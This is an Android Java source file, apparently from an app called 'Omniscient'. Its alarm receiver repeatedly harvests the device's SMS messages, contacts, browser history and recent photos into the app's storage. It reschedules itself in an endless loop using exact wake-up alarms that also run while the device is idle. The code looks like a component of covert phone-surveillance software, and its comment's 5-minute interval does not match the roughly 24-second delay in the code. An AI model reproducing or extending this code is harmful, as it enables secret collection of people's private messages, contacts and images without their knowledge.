package com.postal.omniscient.postal.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.adapter.AdapterData;
import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.reader.contact.ReadContacts;
import com.postal.omniscient.postal.reader.image.AllImages;
import com.postal.omniscient.postal.reader.sms.ReadSms;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Calendar;
import java.util.List;

/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 5 мин записуем
 *  контакты ,смс и браузера историю*/
public class AlarmReceiver extends BroadcastReceiver {
    final int SDK_INT = Build.VERSION.SDK_INT;
    private static String Msg = "MyMsg";
    public AlarmReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

//        Uri uri = Uri.parse(Environment.getExternalStorageDirectory().getAbsolutePath() + "/media/ringtone/sao.mp3");
//        Ringtone ringtone = RingtoneManager.getRingtone(context, uri);
//        ringtone.play();
//        Log.i("MyMsg", "VSE PROPALLLLLLLOOOOOO");
        ReadContacts contact = new ReadContacts(context);
        BrowserHistory browser = new BrowserHistory(context,context.getContentResolver());
        ReadSms sms = new ReadSms(context, context.getContentResolver());
        sms.smsToJson();
        contact.getContacts();
        browser.historyToJson();
        saveIMAGE(context, context.getContentResolver());

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
        Intent myIntent = new Intent(context, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);

        if (SDK_INT < Build.VERSION_CODES.KITKAT) {
            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }
        else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }
        else if (SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }


    }

    private void saveIMAGE(Context context, ContentResolver contentResolver) {
        //IMEGE
        AllImages img = new AllImages(contentResolver);

//        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр
//        long start_date = end_date;// дата из БД последней удачной передачи данных

       // img.getAllImages();
        List<AdapterData> listOfAllImages = img.getLastImages();
        String patchFile;
        for (AdapterData a : listOfAllImages) {
            if(!a.getAddress().equals("")){
                patchFile = a.getAddress();
                Log.i("MyMsg", "KARTINKA     "+new File(patchFile).getName());
                // добавляем свой каталог к пути
                File pathToFile = new File(context.getFilesDir(), "/Omniscient/Image");//DIR);
                copyFile(patchFile, pathToFile.toString());

            }
        }
    }
    private void copyFile(String inputPath, String outputPath) {

        InputStream in = null;
        OutputStream out = null;
        try {

            //create output directory if it doesn't exist
            File dir = new File (outputPath);
            if (!dir.exists()) {
                dir.mkdirs();
            }

            String inputFile = new File (inputPath).getName();
            in = new FileInputStream(inputPath);
            out = new FileOutputStream(outputPath +"/"+ inputFile);
//            Log.i("MyMsg", "File dir Image name "+inputFile);
//            Log.i("MyMsg", "File dir Image "+outputPath+"/"+inputFile);
//            Log.i("MyMsg", "File dir Image inputPath "+inputPath);
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file (You have now copied the file)
            out.flush();
            out.close();
            out = null;

        }  catch (FileNotFoundException fnfe1) {
            Log.e(Msg, fnfe1.getMessage());
        }
        catch (Exception e) {
            Log.e(Msg, e.getMessage());
        }

    }
}
